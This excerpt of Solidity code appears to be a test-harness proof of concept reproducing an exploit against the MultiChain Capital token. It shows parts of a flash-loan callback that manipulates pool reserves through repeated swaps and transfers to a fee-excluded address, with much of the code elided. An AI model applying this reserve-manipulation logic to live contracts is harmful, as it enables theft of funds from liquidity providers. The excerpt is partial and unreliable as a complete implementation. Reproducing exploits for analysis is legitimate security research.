...
contract MultiChainCapitalExploit is Test {
    ...
    function executeOperation(
        ...
        uint256 amountIn = getAmountIn(amount1000 / 100000 * 10001, reserve1, reserve0);
        weth.transfer(address(mcc_weth), amountIn);
        mcc_weth.swap(amount1000 / 100000 * 10001, 0, address(this), new bytes(0));
        ...
        amountIn = getAmountIn(reserve0 * 9003 / 10000 ,reserve1, reserve0);
        weth.transfer(address(mcc_weth), amountIn);
        mcc_weth.swap(reserve0 * 9003 / 10000, 0, excludedFromFeeAddress, new bytes(0));

        for (uint i = 0; i < 15; i ++) {
            func1d89(900);
        }

        mcc.approve(address(this), type(uint).max);
    ...
    function func21b0(uint256 v0) internal {
        (uint256 reserve0, uint256 reserve1, ) = mcc_weth.getReserves();
        uint256 amountIn = getAmountIn(amount1000/100000*v0, reserve1, reserve0);
        weth.transfer(address(mcc_weth), amountIn);
        mcc_weth.swap(amount1000/100000*v0, 0, address(this), new bytes(0));
        mcc.transfer(excludedFromFeeAddress, 1);
    }
